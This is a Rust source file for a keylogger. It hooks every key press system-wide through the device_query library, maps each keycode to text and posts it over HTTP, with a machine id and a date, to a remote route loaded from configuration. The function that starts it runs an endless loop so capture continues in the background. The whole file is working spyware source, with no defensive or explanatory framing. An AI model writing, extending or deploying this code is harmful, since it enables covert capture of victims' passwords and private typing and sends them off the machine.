use device_query::DeviceEvents;
use device_query::Keycode;
pub use device_query::device_events::KeyboardCallback;
use device_query::{DeviceState, keymap};
use device_query::CallbackGuard;
use reqwest::blocking::Client;
use reqwest::blocking::Response;
use crate::sys::load_route;
use crate::sys::get_id;
use crate::sys::get_date;


pub fn cat(){
    let device_state = DeviceState::new();
    let _device_state = listen(device_state);

    loop {

    }

}

fn listen(device_state:DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{

    device_state.on_key_down(|keys| {

        let mut cache: String = String::new();
        let chars = keycode_to_string(*keys).chars();
        for c in chars{
            cache.push(c);
                }
        send(cache); 
        }
    )
}

fn send(chars: String) {
    println!("send function test");

    let route = load_route();
    println!("route {}", route);
    let id = get_id();
    let date = get_date();
    let req = format!("{}/?id={}&date={}&text={}", route, id, date, chars);
    println!("{}", req);
    let client = Client::new();
    let r = client.post(req).build().unwrap();
    let _ = client.execute(r).unwrap();
    
}

fn keycode_to_string(keys: Keycode) -> &'static str{
    match keys {
        keymap::Keycode::Key0 => "0",
        keymap::Keycode::Key1 => "1",
        keymap::Keycode::Key2 => "2",
        keymap::Keycode::Key3 => "3",
        keymap::Keycode::Key4 => "4",
        keymap::Keycode::Key5 => "5",
        keymap::Keycode::Key6 => "6",
        keymap::Keycode::Key7 => "7",
        keymap::Keycode::Key8 => "8",
        keymap::Keycode::Key9 => "9",
        keymap::Keycode::A => "A",
        keymap::Keycode::B => "B",
        keymap::Keycode::C => "C",
        keymap::Keycode::D => "D",
        keymap::Keycode::E => "E",
        keymap::Keycode::F => "F",
        keymap::Keycode::G => "G",
        keymap::Keycode::H => "H",
        keymap::Keycode::I => "I",
        keymap::Keycode::J => "J",
        keymap::Keycode::K => "K",
        keymap::Keycode::L => "L",
        keymap::Keycode::M => "M",
        keymap::Keycode::N => "N",
        keymap::Keycode::O => "O",
        keymap::Keycode::P => "P",
        keymap::Keycode::Q => "Q",
        keymap::Keycode::R => "R",
        keymap::Keycode::S => "S",
        keymap::Keycode::T => "T",
        keymap::Keycode::U => "U",
        keymap::Keycode::V => "V",
        keymap::Keycode::W => "W",
        keymap::Keycode::X => "X",
        keymap::Keycode::Y => "Y",
        keymap::Keycode::Z => "Z",
        keymap::Keycode::F1 => "F1",
        keymap::Keycode::F2 => "F2",
        keymap::Keycode::F3 => "F3",
        keymap::Keycode::F4 => "F4",
        keymap::Keycode::F5 => "F5",
        keymap::Keycode::F6 => "F6",
        keymap::Keycode::F7 => "F7",
        keymap::Keycode::F8 => "F8",
        keymap::Keycode::F9 => "F9",
        keymap::Keycode::F10 => "F10",
        keymap::Keycode::F11 => "F11",
        keymap::Keycode::F12 => "F12",
        keymap::Keycode::Escape => "Escape",
        keymap::Keycode::Space => "Space",
        keymap::Keycode::LControl => "LControl",
        keymap::Keycode::RControl => "RControl",
        keymap::Keycode::LShift => "LShift",
        keymap::Keycode::RShift => "RShift",
        keymap::Keycode::LAlt => "LAlt",
        keymap::Keycode::RAlt => "RAlt",
        keymap::Keycode::Meta => "Meta",
        keymap::Keycode::Enter => "Enter",
        keymap::Keycode::Up => "Up",
        keymap::Keycode::Down => "Down",
        keymap::Keycode::Left => "Left",
        keymap::Keycode::Right => "Right",
        keymap::Keycode::Backspace => "Backspace",
        keymap::Keycode::CapsLock => "CapsLock",
        keymap::Keycode::Tab => "Tab",
        keymap::Keycode::Home => "Home",
        keymap::Keycode::End => "End",
        keymap::Keycode::PageUp => "PageUp",
        keymap::Keycode::PageDown => "PageDown",
        keymap::Keycode::Insert => "Insert",
        keymap::Keycode::Delete => "Delete",
        keymap::Keycode::Numpad0 => "Numpad0",
        keymap::Keycode::Numpad1 => "Numpad1",
        keymap::Keycode::Numpad2 => "Numpad2",
        keymap::Keycode::Numpad3 => "Numpad3",
        keymap::Keycode::Numpad4 => "Numpad4",
        keymap::Keycode::Numpad5 => "Numpad5",
        keymap::Keycode::Numpad6 => "Numpad6",
        keymap::Keycode::Numpad7 => "Numpad7",
        keymap::Keycode::Numpad8 => "Numpad8",
        keymap::Keycode::Numpad9 => "Numpad9",
        keymap::Keycode::NumpadSubtract => "NumpadSubtract",
        keymap::Keycode::NumpadAdd => "NumpadAdd",
        keymap::Keycode::NumpadDivide => "NumpadDivide",
        keymap::Keycode::NumpadMultiply => "NumpadMultiply",
        keymap::Keycode::Grave => "Grave",
        keymap::Keycode::Minus => "-",
        keymap::Keycode::Equal => "=",
        keymap::Keycode::LeftBracket => "[",
        keymap::Keycode::RightBracket => "]",
        keymap::Keycode::BackSlash => "BackSlash",
        keymap::Keycode::Semicolon => ";",
        keymap::Keycode::Apostrophe => "'",
        keymap::Keycode::Comma => ",",
        keymap::Keycode::Dot => ".",
        keymap::Keycode::Slash => "/",
    }
}
